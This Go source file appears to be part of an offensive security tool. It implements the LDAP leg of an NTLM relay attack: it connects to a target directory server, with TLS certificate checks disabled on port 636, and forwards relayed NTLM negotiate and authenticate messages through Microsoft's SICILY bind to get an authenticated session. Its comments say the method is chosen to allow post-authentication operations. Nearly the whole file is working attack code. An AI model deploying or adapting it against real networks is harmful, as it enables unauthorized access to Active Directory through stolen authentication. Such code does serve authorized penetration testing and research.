package commands

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"net"
	"time"

	ber "github.com/go-asn1-ber/asn1-ber"
)

// LDAP NTLM relay bind using SICILY (MS-ADTS §5.1.1.1.3).
//
// SICILY is a Microsoft LDAP extension that wraps raw NTLM (no SPNEGO):
//   Step 1: BindRequest { name="", auth=[10] ntlmType1 } → serverCreds = ntlmType2
//   Step 2: BindRequest { name="", auth=[11] ntlmType3 } → resultCode=0 (success)
//
// Unlike SASL/GSS-SPNEGO, SICILY returns resultCode=0 directly, avoiding
// the saslBindInProgress (14) / mechListMIC issues that prevent post-auth ops.

const (
	ldapAppBindRequest  = 0
	ldapAppBindResponse = 1

	sicilyTagNegotiate = 10
	sicilyTagResponse  = 11
)

type ldapRelayConn struct {
	conn  net.Conn
	msgID int64
}

func ldapRelayDial(target string, port int, timeout time.Duration) (*ldapRelayConn, error) {
	addr := net.JoinHostPort(target, fmt.Sprintf("%d", port))
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return nil, fmt.Errorf("connect to %s: %w", addr, err)
	}
	_ = conn.SetDeadline(time.Now().Add(timeout))

	if port == 636 {
		tlsConn := tls.Client(conn, &tls.Config{InsecureSkipVerify: true})
		if err := tlsConn.Handshake(); err != nil {
			conn.Close()
			return nil, fmt.Errorf("TLS handshake to %s: %w", addr, err)
		}
		return &ldapRelayConn{conn: tlsConn, msgID: 1}, nil
	}

	return &ldapRelayConn{conn: conn, msgID: 1}, nil
}

func (lc *ldapRelayConn) close() {
	lc.conn.Close()
}

// negotiate sends a SICILY Negotiate BindRequest (context tag 10) with the
// raw NTLM Type 1 message and returns the NTLM Type 2 challenge.
func (lc *ldapRelayConn) negotiate(ntlmType1 []byte) ([]byte, error) {
	packet := lc.buildSICILYBindRequest(sicilyTagNegotiate, ntlmType1)

	_, err := lc.conn.Write(packet.Bytes())
	if err != nil {
		return nil, fmt.Errorf("write SICILY negotiate: %w", err)
	}

	respPacket, err := ber.ReadPacket(lc.conn)
	if err != nil {
		return nil, fmt.Errorf("read SICILY negotiate response: %w", err)
	}

	return lc.extractBindResponseCreds(respPacket)
}

// authenticate sends a SICILY Response BindRequest (context tag 11) with the
// raw NTLM Type 3 message and expects resultCode=0.
func (lc *ldapRelayConn) authenticate(ntlmType3 []byte) error {
	packet := lc.buildSICILYBindRequest(sicilyTagResponse, ntlmType3)

	_, err := lc.conn.Write(packet.Bytes())
	if err != nil {
		return fmt.Errorf("write SICILY response: %w", err)
	}

	respPacket, err := ber.ReadPacket(lc.conn)
	if err != nil {
		return fmt.Errorf("read SICILY response: %w", err)
	}

	resultCode, errMsg := lc.parseBindResult(respPacket)
	if resultCode != 0 {
		return fmt.Errorf("LDAP bind failed (code %d): %s", resultCode, errMsg)
	}
	return nil
}

// buildSICILYBindRequest constructs a SICILY BindRequest:
//
//	SEQUENCE { msgID, APPLICATION[0] { version=3, name="", auth=CONTEXT[tag] ntlmBytes } }
func (lc *ldapRelayConn) buildSICILYBindRequest(tag int, ntlmBytes []byte) *ber.Packet {
	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Message")
	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, lc.msgID, "MessageID"))
	lc.msgID++

	bindReq := ber.Encode(ber.ClassApplication, ber.TypeConstructed, ldapAppBindRequest, nil, "Bind Request")
	bindReq.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 3, "Version"))
	bindReq.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "Name"))

	auth := ber.Encode(ber.ClassContext, ber.TypePrimitive, ber.Tag(tag), nil, "SICILY Auth")
	auth.Value = ntlmBytes
	_, _ = auth.Data.Write(ntlmBytes)
	bindReq.AppendChild(auth)

	packet.AppendChild(bindReq)
	return packet
}

func (lc *ldapRelayConn) extractBindResponseCreds(packet *ber.Packet) ([]byte, error) {
	if len(packet.Children) < 2 {
		return nil, fmt.Errorf("malformed LDAP response: expected 2+ children, got %d", len(packet.Children))
	}

	bindResp := packet.Children[1]
	if bindResp.Tag != ldapAppBindResponse {
		return nil, fmt.Errorf("expected BindResponse (tag 1), got tag %d", bindResp.Tag)
	}

	// SICILY returns Type 2 in matchedDN (child[1]); SASL uses
	// serverSaslCreds (context tag 7). Scan all children for NTLM data.
	for _, child := range bindResp.Children {
		data := child.ByteValue
		if len(data) == 0 {
			data = child.Data.Bytes()
		}
		if len(data) >= 8 && bytes.HasPrefix(data, sniffNTLMSig) {
			return data, nil
		}
	}

	// Try serverSaslCreds [7] (may contain SPNEGO-wrapped NTLM)
	for _, child := range bindResp.Children {
		if child.ClassType == ber.ClassContext && child.Tag == 7 {
			creds := child.ByteValue
			if len(creds) == 0 {
				creds = child.Data.Bytes()
			}
			if len(creds) > 0 {
				return creds, nil
			}
		}
	}

	resultCode, errMsg := lc.parseBindResult(packet)
	return nil, fmt.Errorf("no NTLM challenge in bind response (resultCode=%d, msg=%s)", resultCode, errMsg)
}

func (lc *ldapRelayConn) parseBindResult(packet *ber.Packet) (int64, string) {
	if len(packet.Children) < 2 {
		return -1, "malformed response"
	}
	bindResp := packet.Children[1]
	if len(bindResp.Children) < 3 {
		return -1, "malformed bind response"
	}

	resultCode, ok := bindResp.Children[0].Value.(int64)
	if !ok {
		return -1, "cannot parse result code"
	}

	errMsg := ""
	if bindResp.Children[2].Value != nil {
		errMsg = fmt.Sprintf("%v", bindResp.Children[2].Value)
	}

	return resultCode, errMsg
}
